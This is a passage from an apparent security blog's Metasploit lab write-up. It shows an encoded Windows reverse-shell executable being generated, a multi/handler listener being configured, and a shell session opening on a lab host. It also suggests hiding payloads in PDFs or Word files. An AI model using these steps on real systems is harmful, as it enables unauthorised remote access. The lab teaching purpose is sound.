No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86_64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 551 (iteration=0)
x64/xor chosen with final size 551
Payload size: 551 bytes
Saved as: /root/doom.exe
</code></p>

<p>Inside Metasploit, we have to launch the generic payload handler. <a href="https://www.rapid7.com/db/modules/exploit/multi/handler">This module is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.</a>. Don&rsquo;t forget to set the options and the payload to match the one you put in the executable:</p>

<p>``` plain
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf exploit(handler) > options</p>

<p>Module options (exploit/multi/handler):</p>

<p>   Name  Current Setting  Required  Description</p>

<hr />

<p>Payload options (windows/x64/shell/reverse_tcp):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   EXITFUNC  process          yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)
   LHOST     192.168.80.155   yes       The listen address
   LPORT     4444             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Wildcard Target
```</p>

<p>Now run the exploit on your machine. All you need to do now is to transfer your executable to the victim machine and run it there to receive your shell:</p>

<p>``` plain
msf exploit(handler) > run</p>

<p>[<em>] Started reverse TCP handler on 192.168.80.155:4444
[</em>] Starting the payload handler&hellip;
[<em>] Sending stage (336 bytes) to 192.168.80.128
[</em>] Command shell session 1 opened (192.168.80.155:4444 &ndash;> 192.168.80.128:49196) at 2016-06-08 11:19:16 -0400</p>

<p>Microsoft Windows [Version 6.1.7601]
Copyright &copy; 2009 Microsoft Corporation.  All rights reserved.</p>

<p>C:\Users\wingoat\Desktop>
```</p>

<p>Success! This demo was pretty straightforward, but if executables attract too much attention on the target, you can try to sneak your payload into PDFs or Word documents instead.</p>

<h5>Conclusion</h5>

<p>This was a long post, but I wanted to showcase many of Metasploit&rsquo;s capabilities. It was a fun lab, but I barely scratched the surface of what&rsquo;s possible.</p>

<p>``` plain</p>

<hr />

<p>/ Don&rsquo;t hate yourself in the morning &mdash; \
\ sleep till noon.                      /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
